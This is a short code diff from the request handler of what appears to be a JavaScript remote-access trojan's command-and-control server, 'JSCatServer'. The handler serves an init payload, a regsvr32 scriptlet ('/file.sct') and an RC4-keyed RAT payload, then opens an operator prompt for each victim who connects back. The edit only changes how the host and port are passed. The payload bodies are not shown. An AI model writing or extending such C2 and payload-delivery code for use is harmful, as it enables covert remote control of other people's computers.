@@ -83,16 +83,16 @@ class JSCatServer(BaseHTTPRequestHandler):
     def do_GET(self):
         context = b''
         if self.path.startswith('/init'):
-            context = Payload.init(self.server.server_ip)
+            context = Payload.init(self.server.host,self.server.port)
             print('\n[+]received {} client:{}'.format(BOLD('INIT'),
                                                       BOLD(self.client_address[0])))
         elif self.path.startswith('/file.sct'):
-            context = Payload.regsvr(self.server.server_ip)
+            context = Payload.regsvr(self.server.host,self.server.port)
             print('\n[+]received {} client:{}'.format(BOLD("REGSVR32"),
                                                       BOLD(self.client_address[0])))
         elif self.path == '/rat':
             context = Payload.rat(
-                self.server.server_ip, self.server.rc4_key, self.server.sleep_time)
+                self.server.host,self.server.port, self.server.rc4_key, self.server.sleep_time)
             self.server.shell.prompt_msg = '{} >'.format(
                 self.client_address[0])
             print('\n[+]received {} client:{}'.format(BOLD('RAT'),
